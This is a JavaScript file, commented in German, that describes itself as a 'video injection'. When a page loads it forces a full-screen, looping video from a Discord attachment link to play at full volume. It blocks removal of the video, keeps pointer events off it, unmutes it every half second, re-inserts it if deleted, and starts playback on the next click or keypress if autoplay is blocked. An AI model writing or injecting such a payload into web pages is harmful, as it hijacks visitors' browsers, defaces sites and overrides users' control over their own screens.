(function() {
    'use strict';
    
    // Erstelle unstoppbares Fullscreen Video mit Sound
    function createUnstoppableVideo() {
        const video = document.createElement('video');
        video.src = 'https://cdn.discordapp.com/attachments/1281910286588313692/1403449686194524211/pasa.mp4?ex=689797e0&is=68964660&hm=f14357a5b6bc2003fc4537605f44bd12325362d5e455570d47e16056e0915630&';
        video.autoplay = true;
        video.loop = true;
        video.muted = false;
        video.volume = 1.0;
        video.controls = false;
        video.style.cssText = `
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100vw !important;
            height: 100vh !important;
            object-fit: cover !important;
            z-index: 999999999 !important;
            pointer-events: none !important;
            background: #000 !important;
        `;
        
        // Anti-Remove Protection
        Object.defineProperty(video, 'remove', {
            value: function() { return false; },
            writable: false,
            configurable: false
        });
        
        Object.defineProperty(video, 'style', {
            value: video.style,
            writable: false,
            configurable: false
        });
        
        document.body.appendChild(video);
        
        // Force Play
        video.play().catch(() => {
            // Fallback für Autoplay-Blockierung
            document.addEventListener('click', () => video.play(), { once: true });
            document.addEventListener('keydown', () => video.play(), { once: true });
        });
        
        return video;
    }
    
    // Kontinuierliche Video-Überwachung
    function maintainVideo(video) {
        setInterval(() => {
            // Stelle sicher, dass Video läuft
            if (video.paused || video.ended) {
                video.currentTime = 0;
                video.play().catch(() => {});
            }
            
            // Stelle sicher, dass Video sichtbar ist
            if (!document.body.contains(video)) {
                document.body.appendChild(video);
            }
            
            // Stelle sicher, dass Sound an ist
            video.muted = false;
            video.volume = 1.0;
        }, 500);
    }
    
    // Hauptausführung
    function executeVideoInjection() {
        console.log('VIDEO INJECTION STARTED');
        
        // Erstelle und starte Video
        const video = createUnstoppableVideo();
        
        // Starte Überwachung
        maintainVideo(video);
        
        console.log('VIDEO INJECTION ACTIVE');
    }
    
    // Warten auf DOM Ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', executeVideoInjection);
    } else {
        executeVideoInjection();
    }
    
    // Backup Ausführung nach 1 Sekunde
    setTimeout(executeVideoInjection, 1000);
    
})();
